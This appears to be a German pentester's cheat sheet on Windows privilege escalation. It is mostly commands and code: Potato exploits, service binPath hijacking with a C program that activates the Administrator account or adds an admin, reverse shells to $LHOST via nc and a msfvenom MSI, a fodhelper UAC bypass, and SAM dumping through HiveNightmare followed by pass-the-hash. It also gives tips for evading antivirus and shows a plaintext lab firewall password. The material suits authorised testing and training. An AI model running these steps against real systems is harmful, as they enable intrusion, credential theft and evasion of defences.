# 🪟 Windows Privilege Escalation

## 0. Übersicht

```cmd
whoami
whoami /priv
whoami /groups
whoami /all
hostname
systeminfo
ipconfig /all

net user
net user %USERNAME%
net localgroup
net localgroup administrators
```

```powershell
# PowerShell-Variante
Get-LocalUser
Get-LocalGroupMember Administrators
Get-ComputerInfo
```

## 1. Automatisiert

```powershell
# WinPEAS
.\winPEASx64.exe
.\winPEASany.exe quiet cmd

# PowerUp
. .\PowerUp.ps1
Invoke-AllChecks

# PrivescCheck (sehr gut für Service-Misconfigs!)
. .\PrivescCheck.ps1
Invoke-PrivescCheck
Invoke-PrivescCheck -Report PrivescReport -Format TXT

# Seatbelt
.\Seatbelt.exe -group=all

# Sherlock (alt, für Kernel-Exploits)
. .\Sherlock.ps1; Find-AllVulns
```

## 2. Token Privileges (häufigster Win!)

```cmd
whoami /priv
```

| Privilege | Exploit |
|---|---|
| `SeImpersonatePrivilege` | **Potato-Family** (Juicy/Rogue/PrintSpoofer/GodPotato) |
| `SeAssignPrimaryToken` | Potato |
| `SeBackupPrivilege` | SAM/SYSTEM dumpen → secretsdump.py LOCAL |
| `SeRestorePrivilege` | Files überschreiben → Service hijack |
| `SeTakeOwnershipPrivilege` | Datei-Ownership claimen |
| `SeDebugPrivilege` | LSASS-Memory dumpen |
| `SeLoadDriverPrivilege` | Vulnerable Driver laden (BYOVD) |

### Potato-Familie

```cmd
# PrintSpoofer (Server 2019)
PrintSpoofer.exe -i -c cmd

# GodPotato (.NET 3.5+)
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "C:\nc.exe $LHOST 4444 -e cmd"

# JuicyPotato (älter, vor 1809)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c "{CLSID}"

# RoguePotato (1809+)
RoguePotato.exe -r $LHOST -e "cmd.exe" -l 9999
```

## 3. Service Misconfigurations

```cmd
# Services auflisten
sc query
wmic service get name,displayname,pathname,startmode

# Mit accesschk (sysinternals)
accesschk64.exe -uwcqv "Authenticated Users" *
accesschk64.exe -uwcqv %USERNAME% *
```

### ⚠️ Manipulierbarer binPath (Service Path Hijacking) — durchexerziert

Wenn ein niedrig-privilegierter User den `binPath` eines als `LocalSystem`
laufenden Dienstes ändern darf, kann er beliebigen Code als SYSTEM ausführen.

**Schritt 1 — verwundbaren Dienst finden** (PrivescCheck zeigt `UserCanStart`/
`UserCanStop` = True und änderbare Permissions):

```powershell
. .\PrivescCheck.ps1; Invoke-PrivescCheck
# Achte auf: "the current user has modification rights on this service"
```

**Schritt 2 — Payload bauen.** Statt einer Reverse Shell oft am einfachsten:
ein winziges C-Programm, das das Administrator-Konto aktiviert / einen User anlegt.

```c
#include <windows.h>
#include <stdio.h>
int main() {
    system("net user Administrator P@ssw0rd123 /active:yes");
    // alternativ: neuen Admin anlegen
    // system("net user hacker P@ssw0rd123 /add");
    // system("net localgroup Administratoren hacker /add");
    return 0;
}
```

Kompilieren (auf Kali mit mingw):

```bash
x86_64-w64-mingw32-gcc admin.c -o admin.exe
```

**Schritt 3 — Dienst umbiegen und neu starten:**

```cmd
sc.exe config iphlpsvc binPath= "C:\Users\Jenny\Downloads\admin.exe"
sc.exe stop iphlpsvc
sc.exe start iphlpsvc
```

> **Lab-Beispiel VM6 (192.168.1.101):** Der Dienst `iphlpsvc` hatte
> änderbare Permissions (`jenny` = AllAccess). Das obige `admin.exe` (aktiviert
> das lokale Administrator-Konto) als binPath gesetzt, Dienst neu gestartet → danach
> Login als `Administrator`.
> **Hinweis zur Syntax:** Leerzeichen nach `binPath=` ist Pflicht (`sc.exe`-Eigenheit).
> Der Dienststart "scheitert" oft mit Timeout-Fehler (1053) — der Payload läuft trotzdem.
> **Defender aktiv?** Statt msfvenom-EXE direkt `cmd.exe /c net localgroup ...` als binPath
> nehmen oder eigenes C kompilieren → kein Signatur-Treffer. Siehe
> [AV-Evasion](../../99-Resources/av-evasion.md) (Prüfungsfrage 5).

### Unquoted Service Path

```powershell
# Suchen
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

# Beispiel: C:\Program Files\My App\service.exe
# Wir können ablegen: C:\Program.exe oder C:\Program Files\My.exe
# Wenn schreibbar in einem der Pfade
```

### Weak Service Permissions (generisch, mit nc-Payload)

```cmd
sc config <service> binPath= "C:\path\to\nc.exe -e cmd $LHOST 4444"
sc stop <service>
sc start <service>
```

### Weak Registry Permissions auf Service

```powershell
# Reg-Key für Service writable?
Get-Acl HKLM:\System\CurrentControlSet\Services\<service>
# → ImagePath ändern
```

## 4. AlwaysInstallElevated

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
# Beide auf 1 → MSI als SYSTEM!

msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

## 5. Stored Credentials

```cmd
# Klassiker
cmdkey /list
runas /savecred /user:admin cmd

# Registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"      # AutoLogon!

# Files
dir /s /b *unattend* *sysprep* *.config *web.config 2>nul
findstr /si password *.txt *.ini *.config 2>nul
findstr /si pass *.xml *.ini *.txt 2>nul

# Desktop / Dokumente nach abgelegten Passwörtern (oft in Prüfungen!)
type C:\Users\*\Desktop\*.txt 2>nul
dir /s /b C:\Users\*\Desktop\*

# Rekursiv nach Keywords (z.B. Firewall-/pfSense-Passwoerter)
powershell -c "Get-ChildItem C:\Users -Recurse -Include *.txt,*.xml,*.config,*.ini,*.cfg,*.log -EA SilentlyContinue | Select-String -Pattern 'pfsense|firewall|password' -EA SilentlyContinue"

# GPP (cPassword)
findstr /S /I cpassword %LOGONSERVER%\sysvol\*.xml
# → mit gpp-decrypt entschlüsseln

# WLAN-Profile
netsh wlan show profile
netsh wlan show profile name="WLAN" key=clear
```

> **Lab-Beispiel VM6:** Auf dem System lag das Klartext-Passwort für den
> pfSense-Firewall-Admin (`admin:FyDRAquukjS2`). Solche "Notiz-Dateien" auf
> Desktop/Dokumente **immer** prüfen — sie sind oft der Schlüssel zum nächsten
> System (hier: Firewall-Login → Netz-B-Zugang).
> → Firewall-Übernahme: [pfSense-Missbrauch](../../02-Exploitation/Network-Devices/pfsense.md)

## 6. UAC Bypass (von Admin → SYSTEM)

```powershell
# Wenn in Administrators-Gruppe aber Medium IL:
# - fodhelper
# - eventvwr
# - ComputerDefaults
# → meterpreter: bypassuac_fodhelper

# Manuell (fodhelper)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe"
Start-Process "C:\Windows\System32\fodhelper.exe"
```

## 7. DLL Hijacking

```powershell
# Nach fehlenden DLLs in Service-Paths suchen
# Procmon nutzen oder:
.\winPEASany.exe quiet dllhijack
```

## 8. Kernel Exploits

```cmd
systeminfo > sysinfo.txt
# Auf Angreifer:
python windows-exploit-suggester.py --database 2024.xlsx --systeminfo sysinfo.txt
```

Klassiker:
- MS16-032 (Secondary Logon)
- MS16-014 / MS15-051 / MS14-058
- PrintNightmare (CVE-2021-1675/34527)
- HiveNightmare / SeriousSAM (CVE-2021-36934)

## 9. SAM/SYSTEM Dumpen (mit SeBackup)

```cmd
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM

# Auf Angreifer
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

### HiveNightmare / SeriousSAM (CVE-2021-36934)

Auf verwundbaren Win10-Builds sind SAM/SYSTEM/SECURITY-Hives für **jeden**
lokalen User lesbar (über die Volume Shadow Copies).

```powershell
# Verwundbar? (lesbar als low-priv user)
icacls C:\Windows\System32\config\SAM
# → "BUILTIN\Users:(I)(RX)"  = verwundbar

# Hives aus der Shadow Copy kopieren
$shadow = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config"
copy $shadow\SAM      C:\Users\Public\SAM
copy $shadow\SYSTEM   C:\Users\Public\SYSTEM
copy $shadow\SECURITY C:\Users\Public\SECURITY
# (oder fertiges Tool: HiveNightmare.exe / mimikatz misc::shadowcopies)
```

Dann auf dem Angreifer Hashes extrahieren und per Pass-the-Hash nutzen:

```bash
secretsdump.py -system SYSTEM -sam SAM LOCAL
# → Administrator:500:aad3b...:<NTLM-Hash>:::

# Pass-the-Hash über WinRM
evil-winrm -i $RHOST -u Administrator -H <NTLM-HASH>
```

> **Lab-Beispiel VM11 (192.168.2.221):** SAM/SYSTEM über HiveNightmare
> exfiltriert, mit `secretsdump.py` die lokalen Hashes extrahiert und den
> Administrator-NTLM-Hash per `evil-winrm -H` (Pass-the-Hash) für eine
> Admin-Shell genutzt.
> **Verwandt (VM17):** dieselben Hashes lagen als SAM/SYSTEM in einem Forensik-ZIP
> → [PCAP & Forensik-Loot](../../04-Post-Exploitation/Loot-Sources/pcap-und-forensik-artefakte.md).

## 10. AD-spezifisch (Domain User → Domain Admin)

→ Via BloodHound Pfade finden, dann:
- ACL Abuse (GenericAll, WriteDACL, etc.)
- Kerberoasting (siehe [Exploitation/Windows](../../02-Exploitation/Windows/README.md))
- DCSync mit Replicate-Rechten
- Constrained / Unconstrained / Resource-Based Delegation

## 📝 Resources

- [LOLBAS](https://lolbas-project.github.io/) — Living-Off-the-Land Binaries
- [HackTricks Windows](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadAllTheThings — Windows](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [AV-Evasion (ohne msfvenom-EXE)](../../99-Resources/av-evasion.md)
